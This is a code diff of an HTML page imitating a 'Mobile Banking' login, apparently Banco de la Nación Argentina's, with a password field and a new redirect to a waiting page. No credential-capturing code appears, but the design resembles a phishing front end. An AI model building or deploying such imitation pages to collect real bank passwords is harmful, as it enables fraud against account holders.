@@ -8,48 +8,45 @@
 </head>
 <body>
 
-    <!-- Header superior -->
-    <header class="top-bar">
-        <div class="title">Mobile Banking</div>
-    </header>
+<header class="top-bar">
+    <div class="title">Mobile Banking</div>
+</header>
 
-    <!-- Logo (MISMO QUE INDEX) -->
-    <div class="logo-container">
-        <img src="bna.png" alt="Logo">
-    </div>
-
-    <!-- Card login -->
-    <div class="login-card">
-        <div class="login-title">Ingresá tu clave</div>
-
-        <input type="password" placeholder="">
-
-        <div class="btn-row">
-    <button class="btn-accept">
-        <span class="check">✔</span>
-        Aceptar
-    </button>
-
-    <button class="btn-accept" onclick="volver()">
-        Volver
-    </button>
+<div class="logo-container">
+    <img src="bna.png" alt="Logo">
 </div>
 
+<div class="login-card">
+    <div class="login-title">Ingresá tu clave</div>
 
-    <!-- Footer -->
-    <footer class="footer">
-        <span class="close">✖</span>
-        <p>Salir</p>
-    </footer>
+    <input type="password" placeholder="">
 
-    <script>
-        function volver() {
-            window.location.href = "index.html";
-        }
-    </script>
+    <div class="btn-row">
+        <button class="btn-accept" onclick="irAEspera()">
+            <span class="check">✔</span>
+            Aceptar
+        </button>
 
-</body>
-</html>
+        <button class="btn-accept" onclick="volver()">
+            Volver
+        </button>
+    </div>
+</div>
+
+<footer class="footer">
+    <span class="close">✖</span>
+    <p>Salir</p>
+</footer>
+
+<script>
+    function irAEspera() {
+        window.location.href = "espera.html";
+    }
+
+    function volver() {
+        window.location.href = "index.html";
+    }
+</script>
 
 </body>
 </html>
